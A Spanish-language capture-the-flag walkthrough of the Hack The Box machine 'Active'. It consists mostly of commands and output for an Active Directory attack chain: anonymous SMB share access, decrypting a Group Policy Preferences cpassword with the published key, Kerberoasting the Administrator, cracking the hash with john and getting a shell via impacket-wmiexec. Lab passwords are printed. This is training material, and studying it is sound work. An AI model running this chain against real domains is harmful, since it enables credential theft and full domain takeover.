10.10.10.100 - Active
---------------------
![Active](https://user-images.githubusercontent.com/96772264/202671425-74af675c-48ed-4cd1-ae14-5118d4d503c0.png)

# Part 1: Enumeración del sistema

```console
└─$ nmap -T5 -Pn -v 10.10.10.100 # -> 53,88,139,135,389,445,464,593,636,3269,3268,5722,9389
└─$ nmap -sCV -T5 10.10.10.100 -Pn -v -p389,445,464,593,636,3269,3268,5722,9389
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site:e)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site:e)
3269/tcp open  tcpwrapped
5722/tcp open  msrpc         Microsoft Windows RPC
9389/tcp open  mc-nmf        .NET Message Framing
```

Tenemos un directorio activo por los puertos que hemos encontrado, pero lo mejor será encontrar primero algún usaurio para empezar.  
 - Aunque tengamos el puerto 135 no hay mucha suerte: ```rpcclient -U "" 10.10.10.100 -N # NT_STATUS_ACCESS_DENIED```  
 - El puerto 53, no encontramos nada revelavente con el comando **dig**  

-----------------------------------------------
# Part 2: Obteniendo la clave gpp de un usaurio

Tenemos el puerto 445 (smb) del que podemos obtener archivos:
```console
└─$ crackmapexec smb 10.10.10.100
SMB   10.10.10.100  445  DC  [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True)
# Si pone que esta Firmado (signing:True) no se podrán hacer ataques SMBrelays
└─$ smbclient -L //10.10.10.100/ -N
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
└─$ smbclient //10.10.10.100/Replication -N
Anonymous login successful
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
```
Nos ha creado la carpeta Active.htb con todos los recursos:

```console
└─$ tree 
.
├── DfsrPrivate
│   ├── ConflictAndDeleted
│   ├── Deleted
│   └── Installing
├── Policies
│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
│   │   ├── GPT.INI
│   │   ├── Group Policy
│   │   │   └── GPE.INI
│   │   ├── MACHINE
│   │   │   ├── Microsoft
│   │   │   │   └── Windows NT
│   │   │   │       └── SecEdit
│   │   │   │           └── GptTmpl.inf
│   │   │   ├── Preferences
│   │   │   │   └── Groups
│   │   │   │       └── Groups.xml
│   │   │   └── Registry.pol
│   │   └── USER
│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
│       ├── GPT.INI
│       ├── MACHINE
│       │   └── Microsoft
│       │       └── Windows NT
│       │           └── SecEdit
│       │               └── GptTmpl.inf
│       └── USER
└── scripts
```
Hay un montón de cosas, pero el recurso **"Groups.xml"** es lo critico. Que esté este recurso significa que esto es una copia del SYSVOL
(al original no teniamos acceso pero a esto si). En este archivo está la contraseña encriptada del administrador del sistema, 
(la encriptacion es AES-256, un algoritmo muy fuerte).

El asunto esque si tenemos el hash (cpassword) en el groups.xml podemos romper dicho hash muy rapidamente con el cmando gpp ya que microsoft publico la clave de
dicho algoritmo en 2012:
>  Algoritmo -> llave (en el script gpp-decrypt) + texto cifrado -> texto_descrifrado      
>  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"      
>  texto_crifrado = campo cpassword del Groups.xml    

```console
└─$ cd /Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
└─$ cat Groups.xml
(...)
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
userName="active.htb\SVC_TGS" # -> Para este usario
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18  # Esto es la contraseña
```

Vamos a validar este usario:
```
└─$ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStro
```
Con SMBmap puede acceder ahora con credenciales, a la user.txt 
```console
└─$ smbmap -H 10.10.10.100 -u "SVC_TGS" -p "GPPstillStandingStrong2k18" --download Users/SVC_TGS/Desktop/user.txt
```
-----------------------------------------------
# Part 3: Enumeración de usaurios RPC

Ahora podemos acceder al rpc porque ya tenemos creds.
```console
└─$ rpcclient 10.10.10.100 -U "SVC_TGS%GPPstillStandingStrong2k18"
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4] 
user:[Guest] rid:[0x1f5]    # -> Usuario invitado, por defecto en todos los sistemas
user:[krbtgt] rid:[0x1f6]   # -> usuario creado por el kerberos
user:[SVC_TGS] rid:[0x44f]  # -> Nuestro usaurio actual
rpcclient $> enumdomgroups
group:[Domain Admins] rid:[0x200]
rpcclient $> querygroupmem 0x200
	rid:[0x1f4] attr:[0x7]
rpcclient $> queryuser 0x1f4
	User Name   :	Administrator
rpcclient $> querydispinfo
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: (null)
```

-----------------------------------------------
# Part 4: Obteniendo el hash del admin por kerberos

Nada interesante, ahora hay que probar con el puerto 88 (kerberos)

```console
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
-------- # Todo el hash del admin # ---------------------------
└─$ john hash -w=/usr/share/wordlists/rockyou.txt 
Ticketmaster1968 (?)
└─$ impacket-wmiexec active.htb/administrator:Ticketmaster1968@10.10.10.100
```




